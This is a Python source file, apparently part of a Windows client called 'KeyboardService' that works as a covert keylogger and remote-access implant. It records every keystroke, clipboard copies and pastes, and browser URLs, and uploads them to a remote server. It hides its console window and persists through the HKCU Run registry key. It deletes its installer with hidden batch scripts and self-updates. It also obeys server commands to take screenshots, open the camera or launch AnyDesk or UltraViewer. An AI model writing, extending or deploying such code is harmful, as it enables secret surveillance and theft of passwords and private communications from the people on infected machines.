    enum_windows.argtypes = [ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM), wintypes.LPARAM]
    enum_windows.restype = wintypes.BOOL
    callback_type = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
    closed = False

    @callback_type
    def close_window(hwnd, _lparam):
        nonlocal closed
        if not user32.IsWindowVisible(hwnd):
            return True
        length = user32.GetWindowTextLengthW(hwnd)
        if length <= 0:
            return True
        title_buffer = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, title_buffer, length + 1)
        title = title_buffer.value.strip()
        if not title:
            return True
        if title.lower() == target.lower() or target.lower() in title.lower():
            user32.PostMessageW(hwnd, 0x0010, 0, 0)
            closed = True
        return True

    enum_windows(close_window, 0)
    if not closed:
        raise RuntimeError(f"No matching window found for {target}")


def open_camera_app(duration):
    if os.name != "nt":
        raise RuntimeError("Camera control is only supported on Windows")
    try:
        if hasattr(os, "startfile"):
            os.startfile("microsoft.windows.camera:")
        else:
            subprocess.Popen(["cmd", "/c", "start", "", "microsoft.windows.camera:"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as error:
        raise RuntimeError(f"Camera could not be opened: {error}") from error

    end_time = time.monotonic() + duration
    while time.monotonic() < end_time:
        time.sleep(0.25)


def open_remote_app(app_name):
    if os.name != "nt":
        raise RuntimeError("Remote desktop apps are only supported on Windows")

    normalized_app = str(app_name or "").strip().lower()
    app_definitions = {
        "ultraviewer": (
            "UltraViewer",
            [
                os.path.join(os.environ.get("ProgramFiles", r"C:\Program Files"), "UltraViewer", "UltraViewer.exe"),
                os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"), "UltraViewer", "UltraViewer.exe"),
                os.path.join(os.environ.get("LOCALAPPDATA", ""), "UltraViewer", "UltraViewer.exe"),
            ],
            ["UltraViewer.exe", "UltraViewer"],
        ),
        "anydesk": (
            "AnyDesk",
            [
                os.path.join(os.environ.get("ProgramFiles", r"C:\Program Files"), "AnyDesk", "AnyDesk.exe"),
                os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"), "AnyDesk", "AnyDesk.exe"),
                os.path.join(os.environ.get("LOCALAPPDATA", ""), "AnyDesk.exe"),
            ],
            ["AnyDesk.exe", "AnyDesk"],
        ),
    }
    app_definition = app_definitions.get(normalized_app)
    if not app_definition:
        raise RuntimeError("Choose UltraViewer or AnyDesk")
    display_name, candidates, executable_names = app_definition

    executable = next((path for path in candidates if path and os.path.isfile(path)), None)
    if not executable:
        executable = next((shutil.which(name) for name in executable_names if shutil.which(name)), None)
    if not executable:
        raise RuntimeError(f"{display_name} is not installed on this client")

    try:
        subprocess.Popen([executable], cwd=os.path.dirname(executable), close_fds=True)
    except OSError as error:
        raise RuntimeError(f"{display_name} could not be opened: {error}") from error


def open_ultraviewer():
    open_remote_app("ultraviewer")


def get_battery_telemetry():
    if os.name != "nt":
        return {"battery_percent": None, "battery_status": "Unavailable"}
    try:
        class SystemPowerStatus(ctypes.Structure):
            _fields_ = [
                ("ac_line_status", wintypes.BYTE),
                ("battery_flag", wintypes.BYTE),
                ("battery_percent", wintypes.BYTE),
                ("reserved", wintypes.BYTE),
                ("battery_life_seconds", wintypes.DWORD),
                ("battery_full_life_seconds", wintypes.DWORD),
            ]
        status = SystemPowerStatus()
        if not ctypes.windll.kernel32.GetSystemPowerStatus(ctypes.byref(status)):
            return {"battery_percent": None, "battery_status": "Unavailable"}
        percent = None if status.battery_percent == 255 else int(status.battery_percent)
        if status.ac_line_status == 1:
            state = "Charging" if percent is not None and percent < 100 else "Plugged in"
        elif status.ac_line_status == 0:
            state = "On battery"
        else:
            state = "Unknown"
        return {"battery_percent": percent, "battery_status": state}
    except (AttributeError, OSError):
        return {"battery_percent": None, "battery_status": "Unavailable"}


def send_message(text, app_name, source_url="", raw_text=None, is_pasted=False, is_copied=False):
    global last_message_id
    last_message_id = max(last_message_id + 1, int(time.time() * 1000))
    if not source_url and app_name:
        source_url = get_message_source_url(app_name)
    payload = {
        "message_id": last_message_id,
        "text": text,
        "raw_text": raw_text if raw_text is not None else text,
        "device_id": device_id,
        "device_name": device_name,
        "app_name": app_name,
        "source_url": source_url,
        "is_pasted": is_pasted,
        "is_copied": is_copied,
    }
    remember_pending_message(payload)
    if post_message(payload):
        forget_pending_message(payload)
    return payload


def retry_pending_messages():
    for payload in load_pending_messages():
        retry_payload = {**payload, "retry": True}
        if post_message(retry_payload, quiet=True):
            forget_pending_message(payload)


def send_heartbeat():
    global SITE_URL
    try:
        headers = {"Content-Type": "application/json"}
        api_key = os.getenv("INGEST_API_KEY", "").strip()
        if api_key:
            headers["x-api-key"] = api_key
        request = Request(
            f"{SITE_URL}/api/devices/heartbeat",
            data=json.dumps(
                {
                    "device_id": device_id,
                    "device_name": device_name,
                    "client_version": APP_VERSION,
                    "started_at": client_started_at,
                    **get_device_telemetry(),
                }
            ).encode("utf-8"),
            headers=headers,
            method="POST",
        )
        with urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
            heartbeat = json.loads(response.read().decode("utf-8"))
        updated_site_url = heartbeat.get("client_site_url", "").strip().rstrip("/")
        if updated_site_url and updated_site_url != SITE_URL:
            parsed_url = urlparse(updated_site_url)
            if parsed_url.scheme in ("http", "https") and parsed_url.netloc:
                SITE_URL = updated_site_url
                os.makedirs(INSTALL_DIR, exist_ok=True)
                with open(CONFIG_PATH, "w", encoding="utf-8") as config_file:
                    json.dump({"site_url": SITE_URL}, config_file, indent=2)
                print(f"Client service URL updated to {SITE_URL}")
        if heartbeat.get("screenshot_requested"):
            trigger_screenshot_capture()
        handle_device_command(
            heartbeat.get("command"), heartbeat.get("command_id"), heartbeat.get("message", "")
        )
    except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
        print(f"Could not send device heartbeat: {error}")


def mark_device_offline():
    try:
        request = Request(
            f"{SITE_URL}/api/devices/offline",
            data=json.dumps({"device_id": device_id}).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urlopen(request, timeout=3) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
    except (HTTPError, URLError, TimeoutError, RuntimeError, OSError) as error:
        print(f"Could not mark device offline: {error}")


def hide_current_window():
    if os.name != "nt":
        return
    try:
        user32 = ctypes.windll.user32
        hwnd = user32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)
            user32.UpdateWindow(hwnd)
    except Exception:
        pass


def get_installed_startup_path():
    if getattr(sys, "frozen", False):
        if is_in_update_directory(sys.executable):
            return os.path.abspath(sys.executable)
        return os.path.abspath(INSTALL_PATH)
    return os.path.abspath(os.path.join(INSTALL_DIR, "KeyboardService.py"))


def is_in_update_directory(path):
    update_root = os.path.normcase(os.path.abspath(UPDATE_DIR))
    candidate_path = os.path.normcase(os.path.abspath(path))
    try:
        return os.path.commonpath((update_root, candidate_path)) == update_root
    except ValueError:
        return False


def create_versioned_update_directory(version):
    safe_version = re.sub(r"[^A-Za-z0-9._-]", "_", str(version)).strip("._-")
    if not safe_version:
        raise RuntimeError("version cannot be used as an update folder")
    update_directory = os.path.join(UPDATE_DIR, safe_version, uuid.uuid4().hex)
    os.makedirs(update_directory, exist_ok=True)
    return update_directory


def install_self_to_startup_location():
    if getattr(sys, "frozen", False):
        if is_in_update_directory(sys.executable):
            return os.path.abspath(sys.executable)
        target_path = os.path.abspath(INSTALL_PATH)
        os.makedirs(INSTALL_DIR, exist_ok=True)
        if not os.path.exists(target_path):
            shutil.copy2(sys.executable, target_path)
        return target_path

    source_path = os.path.abspath(__file__)
    target_path = os.path.abspath(get_installed_startup_path())
    if os.path.normcase(source_path) == os.path.normcase(target_path):
        return target_path

    os.makedirs(INSTALL_DIR, exist_ok=True)
    source_is_newer = (
        not os.path.exists(target_path)
        or os.path.getsize(source_path) != os.path.getsize(target_path)
        or os.path.getmtime(source_path) > os.path.getmtime(target_path)
    )
    if source_is_newer:
        shutil.copy2(source_path, target_path)
    return target_path


def get_startup_command():
    if getattr(sys, "frozen", False):
        if running_from_local_project() or running_from_temp_bundle():
            return f'"{sys.executable}"'
        return f'"{install_self_to_startup_location()}"'

    target_path = install_self_to_startup_location()
    return f'"{sys.executable}" "{target_path}"'


def register_startup_launch():
    if os.name != "nt":
        return

    try:
        import winreg

        startup_command = get_startup_command()
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        ) as startup_key:
            winreg.SetValueEx(
                startup_key,
                STARTUP_ENTRY_NAME,
                0,
                winreg.REG_SZ,
                startup_command,
            )
    except OSError as error:
        print(f"Could not register automatic startup: {error}")


def running_from_local_project():
    if not getattr(sys, "frozen", False):
        return False

    project_root = os.path.abspath(os.getcwd())
    marker_files = ["client.py", "KeyboardService.spec", "requirements.txt"]
    if not all(os.path.exists(os.path.join(project_root, marker)) for marker in marker_files):
        return False

    exe_path = os.path.abspath(sys.executable)
    return exe_path.lower().startswith(project_root.lower())


def running_from_temp_bundle():
    if not getattr(sys, "frozen", False):
        return False

    extraction_path = getattr(sys, "_MEIPASS", None)
    if not extraction_path:
        return False

    exe_path = os.path.normcase(os.path.abspath(sys.executable))
    extraction_path = os.path.normcase(os.path.abspath(extraction_path))
    try:
        return os.path.commonpath((exe_path, extraction_path)) == extraction_path
    except ValueError:
        return False


def schedule_installer_cleanup(source_path):
    helper_path = os.path.join(INSTALL_DIR, f"cleanup_{os.getpid()}.cmd")
    source_path = os.path.abspath(source_path)
    lines = [
        "@echo off",
        ":wait",
        f'tasklist /FI "PID eq {os.getpid()}" | find "{os.getpid()}" >nul',
        "if not errorlevel 1 (",
        "  timeout /t 1 /nobreak >nul",
        "  goto wait",
        ")",
        f'del /f /q "{source_path}" >nul 2>&1',
        'del "%~f0"',
    ]
    with open(helper_path, "w", encoding="ascii", newline="\r\n") as helper:
        helper.write("\r\n".join(lines) + "\r\n")
    startup_info = subprocess.STARTUPINFO()
    startup_info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startup_info.wShowWindow = 0
    subprocess.Popen(["cmd.exe", "/c", helper_path], close_fds=True, startupinfo=startup_info)


def install_and_relaunch():
    if os.name != "nt":
        return False

    if getattr(sys, "frozen", False):
        if running_from_local_project() or running_from_temp_bundle():
            stale_installed = os.path.abspath(INSTALL_PATH)
            if os.path.exists(stale_installed):
                try:
                    os.remove(stale_installed)
                except OSError:
                    pass
            return False

        current_path = os.path.normcase(os.path.abspath(sys.executable))
        if is_in_update_directory(current_path):
            return False
        installed_path = os.path.normcase(os.path.abspath(INSTALL_PATH))
        if current_path == installed_path:
            return False

        try:
            update_directory = create_versioned_update_directory(APP_VERSION)
            updated_path = os.path.join(update_directory, UPDATE_ASSET_NAME)
            shutil.copy2(sys.executable, updated_path)
            startup_info = subprocess.STARTUPINFO()
            startup_info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startup_info.wShowWindow = 0
            subprocess.Popen([updated_path], close_fds=True, startupinfo=startup_info)
            schedule_installer_cleanup(current_path)
            return True
        except OSError as error:
            print(f"Could not install KeyboardService: {error}")
            return False

    current_script = os.path.abspath(__file__)
    installed_script = os.path.abspath(get_installed_startup_path())
    if os.path.normcase(current_script) == os.path.normcase(installed_script):
        return False

    try:
        os.makedirs(INSTALL_DIR, exist_ok=True)
        source_is_newer = (
            not os.path.exists(installed_script)
            or os.path.getsize(current_script) != os.path.getsize(installed_script)
            or os.path.getmtime(current_script) > os.path.getmtime(installed_script)
        )
        if source_is_newer:
            shutil.copy2(current_script, installed_script)

        startup_info = subprocess.STARTUPINFO()
        startup_info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startup_info.wShowWindow = 0
        subprocess.Popen([sys.executable, installed_script], close_fds=True, startupinfo=startup_info)
        return True
    except OSError as error:
        print(f"Could not install KeyboardService script: {error}")
        return False


def version_tuple(value):
    match = re.search(r"(?:v)?(\d+)(?:\.(\d+))?(?:\.(\d+))?(?:\.(\d+))?(?:\.(\d+))?", value or "")
    if not match:
        return (0, 0, 0, 0, 0)
    return tuple(int(part or 0) for part in match.groups())


def github_ssl_context():
    context = ssl.create_default_context()
    context.load_verify_locations(cafile=certifi.where())
    return context


def download_update():
    ssl_context = github_ssl_context()
    request = Request(
        UPDATE_API_URL,
        headers={
            "Accept": "application/vnd.github+json",
            "User-Agent": f"KeyboardService/{APP_VERSION}",
        },
    )
    with urlopen(request, timeout=15, context=ssl_context) as response:
        release = json.loads(response.read().decode("utf-8"))

    latest_tag = str(release.get("tag_name", "")).strip()
    if not latest_tag or version_tuple(latest_tag) <= version_tuple(APP_VERSION):
        return None

    asset = next(
        (
            item for item in release.get("assets", [])
            if item.get("name") == UPDATE_ASSET_NAME and item.get("browser_download_url")
        ),
        None,
    )
    if not asset:
        print(f"Update {latest_tag} has no {UPDATE_ASSET_NAME} asset")
        return None

    update_directory = create_versioned_update_directory(latest_tag)
    temporary_path = os.path.join(update_directory, f"{UPDATE_ASSET_NAME}.download")
    download_request = Request(
        asset["browser_download_url"],
        headers={"User-Agent": f"KeyboardService/{APP_VERSION}"},
    )
    digest = hashlib.sha256()
    try:
        with urlopen(download_request, timeout=120, context=ssl_context) as response, open(temporary_path, "wb") as output:
            while True:
                chunk = response.read(1024 * 1024)
                if not chunk:
                    break
                digest.update(chunk)
                output.write(chunk)

        expected_digest = str(asset.get("digest", ""))
        if expected_digest.startswith("sha256:") and digest.hexdigest().lower() != expected_digest[7:].lower():
            raise RuntimeError("download checksum did not match GitHub release metadata")
        return temporary_path, latest_tag
    except Exception:
        try:
            os.remove(temporary_path)
        except OSError:
            pass
        raise


def send_successful_update_notice(previous_version="", new_version=""):
    previous = str(previous_version or APP_VERSION).strip()
    updated = str(new_version or APP_VERSION).strip()
    if not previous or not updated:
        return
    message = (
        "<b>┌─[ CLIENT UPDATE // SUCCESS ]</b>\n"
        f"<b>Version:</b> {html.escape(previous)} -> {html.escape(updated)}\n"
        f"<b>Device:</b> {html.escape(device_name)}\n"
        "<b>└─[ KeyboardClient // ONLINE ]</b>"
    )
    send_telegram_log(message)


def schedule_update(temporary_path, previous_version=None, new_version=None, command_id=None):
    source_path = os.path.abspath(temporary_path)
    update_directory = os.path.dirname(source_path)
    helper_path = os.path.join(update_directory, f"update_{os.getpid()}.cmd")
    target_path = os.path.join(update_directory, UPDATE_ASSET_NAME)
    previous = str(previous_version or APP_VERSION).strip()
    updated = str(new_version or APP_VERSION).strip()
    update_command_argument = f' --update-command-id "{command_id}"' if command_id else ""
    lines = [
        "@echo off",
        ":wait",
        f'tasklist /FI "PID eq {os.getpid()}" | find "{os.getpid()}" >nul',
        "if not errorlevel 1 (",
        "  timeout /t 1 /nobreak >nul",
        "  goto wait",
        ")",
        ":replace",
        f'move /y "{source_path}" "{target_path}" >nul 2>&1',
        "if errorlevel 1 (",
        "  timeout /t 1 /nobreak >nul",
        "  goto replace",
        ")",
        f'start "" "{target_path}" --post-update-success --previous-version "{previous}" --new-version "{updated}" --site-url "{SITE_URL}"{update_command_argument}',
        f'del /f /q "{source_path}" >nul 2>&1',
        'del "%~f0"',
    ]
    with open(helper_path, "w", encoding="ascii", newline="\r\n") as helper:
        helper.write("\r\n".join(lines) + "\r\n")
    startup_info = subprocess.STARTUPINFO()
    startup_info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startup_info.wShowWindow = 0
    subprocess.Popen(["cmd.exe", "/c", helper_path], close_fds=True, startupinfo=startup_info)


def cleanup_old_update_versions():
    if not os.path.isdir(UPDATE_DIR):
        return

    version_directories = []
    for entry in os.scandir(UPDATE_DIR):
        if not entry.is_dir():
            continue
        parsed_version = version_tuple(entry.name)
        if not re.fullmatch(r"v?\d+(?:\.\d+){0,4}", entry.name, re.IGNORECASE):
            continue
        version_directories.append((parsed_version, entry.path))
    if len(version_directories) <= 2:
        return

    current_path = os.path.abspath(sys.executable)
    current_version = None
    if is_in_update_directory(current_path):
        current_version = os.path.basename(os.path.dirname(os.path.dirname(current_path)))
    current_tuple = version_tuple(current_version or APP_VERSION)
    version_directories.sort(key=lambda item: item[0], reverse=True)
    keep_paths = {
        path for parsed_version, path in version_directories
        if parsed_version == current_tuple
    }
    if not keep_paths:
        keep_paths.add(version_directories[0][1])
    for parsed_version, path in version_directories:
        if path in keep_paths:
            continue
        if parsed_version < current_tuple:
            keep_paths.add(path)
            break
    for _parsed_version, path in version_directories:
        if path in keep_paths:
            continue
        try:
            shutil.rmtree(path)
        except OSError as error:
            print(f"Could not remove old update directory {path}: {error}")


def cleanup_update_artifacts():
    cleanup_old_update_versions()
    stale_paths = [
        os.path.join(INSTALL_DIR, f"{UPDATE_ASSET_NAME}.download"),
        *glob.glob(os.path.join(INSTALL_DIR, "update_*.cmd")),
        *glob.glob(os.path.join(INSTALL_DIR, "cleanup_*.cmd")),
    ]
    for path in stale_paths:
        try:
            if os.path.abspath(path) != os.path.abspath(sys.argv[0]):
                os.remove(path)
        except OSError:
            pass


def check_for_updates(command_id=None):
    if os.name != "nt" or not getattr(sys, "frozen", False):
        return False
    if not update_lock.acquire(blocking=False):
        if command_id:
            acknowledge_device_command(command_id, "failed", "Another update is already in progress.")
        return False
    try:
        result = download_update()
        if not result:
            if command_id:
                acknowledge_device_command(command_id, "failed", "No update available.")
            return False
        temporary_path, latest_tag = result
        print(f"Updating KeyboardService from {APP_VERSION} to {latest_tag}")
        schedule_update(
            temporary_path,
            previous_version=APP_VERSION,
            new_version=latest_tag,
            command_id=command_id,
        )
        os._exit(0)
        return True
    except Exception as error:
        print(f"Could not check for KeyboardService updates: {error}")
        if command_id:
            acknowledge_device_command(command_id, "failed", str(error))
        return False
    finally:
        update_lock.release()


def update_checker():
    time.sleep(5)
    check_for_updates()


def heartbeat_sender():
    while True:
        send_heartbeat()
        time.sleep(HEARTBEAT_INTERVAL_SECONDS)


def message_sender():
    last_retry_at = 0
    while True:
        try:
            text, app_name, source_url, raw_text, is_pasted, is_copied = message_queue.get(timeout=5)
            send_message(text, app_name, source_url, raw_text, is_pasted, is_copied)
            message_queue.task_done()
        except Exception:
            pass
        if time.time() - last_retry_at >= MESSAGE_RETRY_INTERVAL_SECONDS:
            retry_pending_messages()
            retry_pending_raw_batches()
            last_retry_at = time.time()


def queue_raw_token(token, app_name):
    global raw_batch_started_at, raw_flush_timer
    now = int(time.time() * 1000)
    with raw_batch_lock:
        if raw_batch_started_at is None:
            raw_batch_started_at = now
        raw_batch_events.append({"time": now, "key": token, "app_name": app_name})
    if raw_flush_timer is None:
        raw_flush_timer = Timer(RAW_BATCH_INTERVAL_SECONDS, flush_raw_log)
        raw_flush_timer.daemon = True
        raw_flush_timer.start()


def flush_raw_log():
    global raw_batch_events, raw_batch_started_at, raw_flush_timer
    with raw_batch_lock:
        events = raw_batch_events
        raw_batch_events = []
        raw_batch_started_at = None
        raw_flush_timer = None
    upload_raw_batch(events)


def queue_copied_clipboard(target):
    time.sleep(0.1)
    copied_text = get_clipboard_text().strip()
    if copied_text:
        source_url = get_browser_url(target)
        message_queue.put((copied_text, target, source_url, copied_text, False, True))


def flush_message_buffer():
    global message_buffer, raw_message_buffer, last_key_time_ms, message_started_ms
    global active_target, active_target_key
    text = message_buffer.strip()
    raw_text = raw_message_buffer.strip()
    message_buffer = ""
    raw_message_buffer = ""
    last_key_time_ms = None
    message_started_ms = None
    if text:
        target = active_target or get_active_app()
        source_url = get_browser_url(target)
        message_queue.put((text, target, source_url, raw_text, False, False))
    active_target = None
    active_target_key = None


def on_press(key):
    global message_buffer, raw_message_buffer, last_key_time_ms, message_started_ms
    global active_target, active_target_key
    if collection_paused:
        return
    with state_lock:
        modifier_aliases = {
            Key.shift_l: Key.shift, Key.shift_r: Key.shift, Key.ctrl_l: Key.ctrl,
            Key.ctrl_r: Key.ctrl, Key.alt_l: Key.alt, Key.alt_r: Key.alt,
            Key.cmd_l: Key.cmd, Key.cmd_r: Key.cmd,
        }
        if key in modifier_aliases or key in (Key.shift, Key.ctrl, Key.alt, Key.cmd):
            active_modifiers.add(modifier_aliases.get(key, key))
            raw_token = raw_key_value(key)
            raw_message_buffer += raw_token
            queue_raw_token(raw_token, get_active_app())
            return

        key_char = (key.char or "") if isinstance(key, KeyCode) else ""
        raw_symbol = raw_key_value(key)
        if raw_symbol:
            raw_message_buffer += raw_symbol
            queue_raw_token(raw_symbol, get_active_app())
        is_paste_key = key_char.lower() == "v" or key_char == "\x16"
        is_copy_key = key_char.lower() == "c" or key_char == "\x03"
        if is_copy_key and Key.ctrl in active_modifiers:
            target, _target_key = get_active_target()
            Thread(target=queue_copied_clipboard, args=(target,), daemon=True).start()
            return
        if is_paste_key and Key.ctrl in active_modifiers:
            pasted_text = get_clipboard_text().strip()
            if pasted_text:
                flush_message_buffer()
                target, target_key = get_active_target()
                source_url = get_browser_url(target)
                message_queue.put((pasted_text, target, source_url, pasted_text, True, False))
            return

        symbol = normalize_key(key)
        now_ms = time.time() * 1000
        if symbol == "\b":
            message_buffer = message_buffer[:-1]
            last_key_time_ms = now_ms
        elif symbol == "\n":
            flush_message_buffer()
        elif symbol:
            target, target_key = get_active_target()
            if message_buffer and active_target_key != target_key:
                flush_message_buffer()
            if not message_buffer:
                active_target = target
                active_target_key = target_key
            if message_buffer and last_key_time_ms and now_ms - last_key_time_ms >= MESSAGE_GAP_MS:
                flush_message_buffer()
                active_target = target
                active_target_key = target_key
            if message_started_ms is None:
                message_started_ms = now_ms
            message_buffer += symbol
            last_key_time_ms = now_ms


def on_release(key):
    aliases = {
        Key.shift_l: Key.shift, Key.shift_r: Key.shift, Key.ctrl_l: Key.ctrl,
        Key.ctrl_r: Key.ctrl, Key.alt_l: Key.alt, Key.alt_r: Key.alt,
        Key.cmd_l: Key.cmd, Key.cmd_r: Key.cmd,
    }
    active_modifiers.discard(aliases.get(key, key))


def start_keyboard_listener():
    global SERVICE_KEYBOARD_LISTENER
    print(f"Sending to {SITE_URL}")
    register_startup_launch()
    atexit.register(mark_device_offline)
    atexit.register(flush_raw_log)
    Thread(target=message_sender, daemon=True).start()
    Thread(target=heartbeat_sender, daemon=True).start()
    Thread(target=update_checker, daemon=True).start()
    Thread(target=screenshot_request_poller, daemon=True).start()
    with Listener(on_press=on_press, on_release=on_release) as keyboard_listener:
        SERVICE_KEYBOARD_LISTENER = keyboard_listener
        keyboard_listener.join()


def run_client():
    if install_and_relaunch():
        sys.exit(0)
    cleanup_update_artifacts()
    if POST_UPDATE_COMMAND_ID:
        acknowledge_device_command(POST_UPDATE_COMMAND_ID, "completed")
    if POST_UPDATE_SUCCESS:
        send_successful_update_notice(PREVIOUS_VERSION, NEW_VERSION)
    hide_current_window()
    start_keyboard_listener()


def main():
    if len(sys.argv) > 1 and sys.argv[1].lower() == "--service":
        from service_client import main as service_main
        service_main()
    else:
        run_client()


if __name__ == "__main__":
    main()